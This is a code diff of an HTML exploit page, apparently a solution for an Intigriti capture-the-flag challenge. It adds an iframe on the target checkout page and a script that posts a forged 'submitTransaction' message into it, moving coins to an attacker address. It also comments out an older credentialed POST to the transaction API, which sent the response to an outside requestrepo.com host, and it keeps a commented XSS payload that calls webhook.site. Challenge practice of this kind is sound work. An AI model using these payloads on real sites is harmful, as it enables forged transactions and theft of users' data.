@@ -1,26 +1,38 @@
 <html>
 <body>
+    <iframe id="victim" src="https://challenge-0126.intigriti.io/checkout.html?currency=1337COIN&price=45000" ></iframe>
+
     <script>        
         //const xssPayload = '\"\u003E\u003Cimg src=x onerror=fetch(`https://webhook.site/3bebad70-172f-48e4-b855-b4a268be6ca9/XSS_SUCCESS`)\u003E';
+        const payload = {
+                  type: 'submitTransaction',
+                  transaction: {
+                    toAddress: '1e0a26e7854fbcc1bf60b86fb2ce47d4dc',
+                    currency: '1337COIN',
+                    amount: 10
+                  }
+                };
+        
+        setTimeout(() => document.getElementById('victim').contentWindow.postMessage(payload, '*'), 2000);
 
-            fetch('https://challenge-0126.intigriti.io/api/transaction', {
-                method: 'POST',
-                credentials: 'include',
-                headers: {
-                    'Content-Type': 'application/json'
-                },
-                body: JSON.stringify({
-                    "toAddress": "1e0a26e7854fbcc1bf60b86fb2ce47d4dc",
-                    "currency": "1337COIN",
-                    "amount": 1
-                })
-            })
-            .then(res => res.text())
-            .then(data => {
-                const urlSafeData = 'https://we6hfxdk.requestrepo.com?data=' + encodeURIComponent(data);
-                fetch(urlSafeData);
-            });
-        //document.writeln(win);
+        //     fetch('https://challenge-0126.intigriti.io/api/transaction', {
+        //         method: 'POST',
+        //         credentials: 'include',
+        //         headers: {
+        //             'Content-Type': 'application/json'
+        //         },
+        //         body: JSON.stringify({
+        //             "toAddress": "1e0a26e7854fbcc1bf60b86fb2ce47d4dc",
+        //             "currency": "1337COIN",
+        //             "amount": 1
+        //         })
+        //     })
+        //     .then(res => res.text())
+        //     .then(data => {
+        //         const urlSafeData = 'https://we6hfxdk.requestrepo.com?data=' + encodeURIComponent(data);
+        //         fetch(urlSafeData);
+        //     });
+        // //document.writeln(win);
     </script>
 </body>
 </html>
